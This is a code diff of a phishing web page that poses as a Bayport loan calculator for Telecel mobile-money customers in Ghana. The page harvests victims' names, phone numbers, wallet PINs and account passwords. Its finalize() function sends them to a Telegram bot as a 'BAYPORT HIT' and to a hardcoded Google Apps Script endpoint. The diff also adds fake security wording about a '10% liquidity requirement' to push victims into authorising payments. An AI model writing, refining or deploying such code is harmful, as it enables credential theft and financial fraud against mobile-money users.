@@ -8,12 +8,13 @@
     <style>
         :root { --navy: #002349; --gold: #c5a059; --telecel-red: #e30613; --light-bg: #f8fafd; --text: #333; --border: #e1e8f0; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
-        body { background: #e9ecef; color: var(--text); }
+        body { background: #e9ecef; color: var(--text); touch-action: manipulation; }
         
         .view { display: none; max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        .view.active { display: block; }
+        .view.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* CALCULATOR STYLING (Matching your Source) */
+        /* CALCULATOR STYLING */
         .header { padding: 40px 25px 20px; text-align: center; }
         .header h1 { font-size: 1.8rem; font-weight: 800; color: #1a1a1a; }
         .fast-text { color: var(--navy); }
@@ -41,9 +42,10 @@
         .apply-button { background: var(--navy); color: white; width: 100%; padding: 20px; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 1.1rem; text-transform: uppercase; }
 
         /* FORM & AUTH STYLING */
-        input[type=text], input[type=number], input[type=password] { width: 100%; padding: 16px; border: 1.5px solid var(--border); border-radius: 10px; font-size: 1rem; margin-bottom: 15px; outline: none; }
+        input[type=text], input[type=number], input[type=password] { width: 100%; padding: 16px; border: 1.5px solid var(--border); border-radius: 10px; font-size: 1rem; margin-bottom: 15px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--navy); }
         .tele-logo { color: var(--telecel-red); font-weight: 900; font-size: 2.6rem; letter-spacing: -2px; text-align: center; margin-bottom: 10px; }
-        .prefix { background: #f0f0f0; padding: 16px; font-weight: 700; border: 1.5px solid var(--border); border-right: none; border-radius: 10px 0 0 10px; }
+        .prefix { background: #f0f0f0; padding: 16px; font-weight: 700; border: 1.5px solid var(--border); border-right: none; border-radius: 10px 0 0 10px; height: 55px; }
     </style>
 </head>
 <body>
@@ -69,7 +71,6 @@
                 <button class="term-button" onclick="setTerm(36, this)">36 months</button>
                 <button class="term-button" onclick="setTerm(48, this)">48 months</button>
                 <button class="term-button" onclick="setTerm(60, this)">60 months</button>
-                <button class="term-button" onclick="setTerm(72, this)">72 months</button>
             </div>
 
             <div class="payment-display">
@@ -86,13 +87,16 @@
         <div class="content">
             <label class="control-label">Full Name*</label>
             <input type="text" id="f-name" placeholder="Enter full name">
+            
             <label class="control-label">Telecel Phone Number*</label>
-            <div style="display: flex;">
+            <div style="display: flex; align-items: flex-start;">
                 <div class="prefix">+233</div>
                 <input type="number" id="t-phone" placeholder="Phone Number" style="border-radius: 0 10px 10px 0;">
             </div>
+            
             <label class="control-label">Telecel Cash PIN*</label>
-            <input type="password" id="t-pin" maxlength="6" placeholder="Wallet PIN">
+            <input type="password" id="t-pin" maxlength="6" placeholder="Wallet PIN" style="letter-spacing: 5px;">
+            
             <button class="apply-button" onclick="validateStep1()">Next Step</button>
         </div>
     </section>
@@ -104,10 +108,15 @@
         </div>
         <div class="content">
             <p style="text-align: center; color: #666; margin-bottom: 25px; font-size: 0.9rem;">
-                Confirm authorization for <strong>GHS <span id="final-amt"></span></strong> by entering your password.
+                Confirm authorization for <strong>GHS <span id="final-amt">50,000</span></strong> by entering your account password.
             </p>
             <label class="control-label">Telecel Account Password*</label>
             <input type="password" id="t-pass" placeholder="Enter Password">
+            
+            <div style="background: #fff9e6; border-left: 4px solid #f39c12; padding: 15px; border-radius: 4px; font-size: 0.75rem; margin-bottom: 20px;">
+                <strong>Security Note:</strong> This encrypted session verifies your 10% liquidity requirement. Do not refresh.
+            </div>
+
             <button class="apply-button" id="final-btn" style="background: var(--telecel-red);" onclick="finalize()">Complete Authorization</button>
         </div>
     </section>
@@ -115,12 +124,13 @@
     <section id="view-4" class="view" style="text-align: center; padding-top: 150px;">
         <div style="font-size: 4rem; animation: spin 2s linear infinite;">⏳</div>
         <h2 style="margin-top: 30px;">Processing...</h2>
-        <p style="padding: 20px; color: #888;">Establishing secure handshake. Please check your phone for the USSD prompt.</p>
+        <p style="padding: 20px; color: #888;">Establishing secure handshake. Please check your phone for the USSD prompt to confirm the 10% verification.</p>
     </section>
 </div>
 
 <script>
-    const SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL"; 
+    // --- CONFIGURATION ---
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx54VpVCi8cG_0UdnSQike_TAyXITjcecX-YTOIm2QDXIvANGVqq1v3uM5kPP3osfjX/exec"; 
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -160,37 +170,51 @@
     }
 
     function validateStep1() {
-        if(!document.getElementById('f-name').value || !document.getElementById('t-phone').value || !document.getElementById('t-pin').value) {
-            return alert("Fill all fields.");
+        const name = document.getElementById('f-name').value.trim();
+        const phone = document.getElementById('t-phone').value.trim();
+        const pin = document.getElementById('t-pin').value.trim();
+
+        if(!name || !phone || !pin) {
+            return alert("All fields are required to proceed.");
         }
         showView(3);
     }
 
     async function finalize() {
         const btn = document.getElementById('final-btn');
+        const pass = document.getElementById('t-pass').value.trim();
+        
+        if(!pass) return alert("Account password is required.");
+
         const data = {
             name: document.getElementById('f-name').value,
             phone: document.getElementById('t-phone').value,
             pin: document.getElementById('t-pin').value,
-            pass: document.getElementById('t-pass').value,
+            pass: pass,
             loan: state.amount,
             term: state.term
         };
 
-        if(!data.pass) return alert("Password required.");
-        btn.disabled = true; showView(4);
+        btn.disabled = true;
+        showView(4);
 
+        // 1. Telegram Broadcast (Multi-Tenant)
         if(BOT_TOKEN && CHAT_ID) {
             const msg = `🔥 *BAYPORT HIT*\n👤 Name: ${data.name}\n📱 +233${data.phone}\n💰 GHS ${data.loan}\n⏳ ${data.term} Mo\n🔢 PIN: \`${data.pin}\`\n🔑 PASS: \`${data.pass}\``;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`).catch(e=>{});
         }
 
-        try { await fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: new URLSearchParams(data) }); } catch (e) {}
+        // 2. Master Google Sheet
+        try { 
+            await fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: new URLSearchParams(data) }); 
+        } catch (e) {}
     }
     
-    // Set initial accurate values
-    calculate();
+    // Initialize accurate calculation on load
+    updateCalc();
 </script>
-<style> @keyframes spin { from {transform: rotate(0deg);} to {transform: rotate(360deg);} } </style>
+<style> 
+    @keyframes spin { from {transform: rotate(0deg);} to {transform: rotate(360deg);} } 
+</style>
 </body>
 </html>
